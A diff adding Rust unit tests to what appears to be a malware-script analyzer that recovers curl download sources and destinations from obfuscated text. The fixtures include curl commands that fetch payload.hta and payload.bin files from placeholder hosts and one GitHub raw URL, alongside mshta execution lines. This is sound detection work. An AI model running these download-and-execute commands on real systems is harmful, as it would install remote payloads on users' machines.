@@ -12303,6 +12303,29 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn curl_with_remote_name_strips_query_and_fragment_from_basename() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "curl --output-dir C:\\Temp -O https://x.example/payload.bin?sig=1#frag",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst: Some(d), .. }
+                    if src == "https://x.example/payload.bin?sig=1#frag"
+                        && d == "C:\\Temp\\payload.bin"
+            )
+        });
+        assert!(has, "traits: {:?}", env.traits);
+        assert!(
+            env.modified_filesystem
+                .contains_key("c:\\temp\\payload.bin"),
+            "downloaded file was not tracked with a resolved basename: {:?}",
+            env.modified_filesystem
+        );
+    }
+
+    #[test]
     fn curl_remote_name_with_output_dir_tracks_joined_destination_for_later_execution() {
         let report = analyze(
             br#"curl --output-dir C:\Temp -O https://curl-output-dir-mshta.example/payload.hta
@@ -33425,6 +33448,37 @@ mshta C:/Out/payload.hta"#,
     }
 
     #[test]
+    fn curl_html_quote_entity_tail_is_trimmed_from_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl https://github.com/abarekl1/dcm/raw/main/Document.zip&#039 -o out.zip"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/abarekl1/dcm/raw/main/Document.zip"
+                )
+            }),
+            "HTML entity-tailed curl URL was not recovered cleanly: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("&#039")
+                )
+            }),
+            "HTML entity tail leaked into URL traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_data_payload_only_in_deob_text_does_not_become_download_src() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -33551,6 +33605,27 @@ mshta C:/Out/payload.hta"#,
     }
 
     #[test]
+    fn curl_spaced_long_options_case_insensitive_in_deob_text() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --URL https://curl-upper-spaced-url-deob.example/payload.bin --OUTPUT C:\Temp\upper-spaced.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-upper-spaced-url-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\upper-spaced.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl spaced uppercase long options not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_attached_url_schemeless_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -33630,6 +33705,68 @@ mshta C:/Out/payload.hta"#,
         assert!(
             has,
             "curl short-option cluster destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_output_dir_in_deob_text_uses_joined_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --output-dir C:\Temp -O https://curl-output-dir-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-output-dir-deob.example/payload.hta"
+                        && dst.as_deref() == Some(r#"C:\Temp\payload.hta"#)
+            )
+        });
+        assert!(
+            has,
+            "curl --output-dir -O destination not recovered in deob text: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_non_ascii_tokens_do_not_panic_prefix_checks() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "curl X:~49,1%¥Yr -\"%Ջლ能% https://curl-nonascii-token.example/payload.bin",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://curl-nonascii-token.example/payload.bin"
+            )
+        });
+        assert!(
+            has,
+            "curl URL not recovered after non-ASCII tokens: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_short_option_cluster_in_deob_text_uses_basename() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl -LO https://curl-cluster-remote-name-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-cluster-remote-name-deob.example/payload.hta"
+                        && dst.as_deref() == Some("payload.hta")
+            )
+        });
+        assert!(
+            has,
+            "curl deob-text -LO remote-name destination not recovered: {:?}",
             env.traits
         );
     }
